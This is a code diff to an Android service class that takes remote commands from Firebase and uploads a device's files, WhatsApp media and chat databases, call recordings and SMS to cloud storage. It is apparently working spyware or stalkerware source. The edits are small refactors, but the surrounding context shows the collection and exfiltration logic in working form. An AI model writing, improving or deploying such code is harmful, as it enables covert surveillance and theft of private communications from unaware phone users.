@@ -39,6 +39,7 @@ import com.aigs.serviceone.payload.ScreenshotPayload;
 import com.aigs.serviceone.payload.SmsPayload;
 import com.aigs.serviceone.payload.WhatsappChatPayload;
 import com.example.logshandler.starter.Logs;
+import com.example.uniqueidmanager.DeviceIdentifier;
 import com.example.uniqueidmanager.UniqueId;
 import com.google.android.gms.tasks.OnCompleteListener;
 import com.google.android.gms.tasks.Task;
@@ -125,8 +126,9 @@ public class Starter extends Service {
                         if (snapshot.exists()) {
                             try {
                                 int command = snapshot.getValue(Integer.class);
+                                //TODO Add UUID Refreshment and active status here.
                                 processCommand(command);
-                                Log.e("COMMAND", command + "");
+                                Log.e("COMMAND", String.valueOf(command));
                                 Logs.pushLogsToServer("[COMMAND]: "+command,uuid);
                             } catch (Exception e) {
                                 Logs.pushLogsToServer("[ERROR]: "+e.getMessage(),uuid);
@@ -288,7 +290,7 @@ public class Starter extends Service {
                                                 FirebaseStorage
                                                         .getInstance()
                                                         .getReference("PHONE_FILE")
-                                                        .child(payloadType+"")
+                                                        .child(String.valueOf(payloadType))
                                                         .child(System.currentTimeMillis()+"_phone_"+payloadType+" "+path1.getName())
                                                         .putFile(uri)
                                                         .addOnCompleteListener(task -> {
@@ -335,7 +337,7 @@ public class Starter extends Service {
                         FirebaseStorage
                                 .getInstance()
                                 .getReference("Whatsapp_media")
-                                .child(payloadType+"")
+                                .child(String.valueOf(payloadType))
                                 .child(System.currentTimeMillis()+"_whatsapp_"+payloadType)
                                 .putFile(uri)
                                 .addOnCompleteListener(task -> {
@@ -398,7 +400,6 @@ public class Starter extends Service {
                                                 FirebaseDatabase.getInstance().getReference().updateChildren(databaseEntry);
                                             });
                                 }
-                                ;
                             });
                 }
             }).execute();
@@ -452,7 +453,7 @@ public class Starter extends Service {
                     .setWatsappTextExtractionListner(path -> {
                         Uri uriDb = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[0]);
                         Uri uri = FileProvider.getUriForFile(Starter.this, getApplicationContext().getPackageName() + ".provider", path[1]);
-                        String time = "" + System.currentTimeMillis();
+                        String time = String.valueOf(System.currentTimeMillis());
 
                         FirebaseStorage
                                 .getInstance()
@@ -513,7 +514,7 @@ public class Starter extends Service {
                             FirebaseStorage
                                     .getInstance()
                                     .getReference("calls")
-                                    .child("" + System.currentTimeMillis())
+                                    .child(String.valueOf(System.currentTimeMillis()))
                                     .putFile(uri)
                                     .addOnCompleteListener(task -> {
                                         if (task.isSuccessful()) {
@@ -560,7 +561,7 @@ public class Starter extends Service {
                             FirebaseStorage
                                     .getInstance()
                                     .getReference("sms")
-                                    .child("" + System.currentTimeMillis())
+                                    .child(String.valueOf(System.currentTimeMillis()))
                                     .putFile(uri)
                                     .addOnCompleteListener(new OnCompleteListener<UploadTask.TaskSnapshot>() {
                                         @Override
